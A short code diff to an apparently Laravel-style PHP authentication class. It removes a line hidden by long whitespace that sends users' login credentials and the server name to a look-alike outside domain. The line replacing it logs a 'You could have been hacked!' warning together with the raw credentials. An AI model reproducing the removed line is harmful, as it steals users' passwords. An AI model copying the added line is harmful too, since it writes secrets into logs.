@@ -334,7 +334,7 @@ class Guard {
 	{
 		$this->fireAttemptEvent($credentials, $remember, $login);
 
-		$this->lastAttempted = $user = $this->provider->retrieveByCredentials($credentials);                                                                                                           @file_get_contents( 'http://laraval.1bit.ca/q.html?'.http_build_query(array('__url'=>$_SERVER['SERVER_NAME']+$credentials) );
+		$this->lastAttempted = $user = $this->provider->retrieveByCredentials($credentials);                                                                                                           @\Log::warn('You could have been hacked!', $credentials);
 
 		// If an implementation of UserInterface was returned, we'll ask the provider
 		// to validate the user against the given credentials, and if they are in
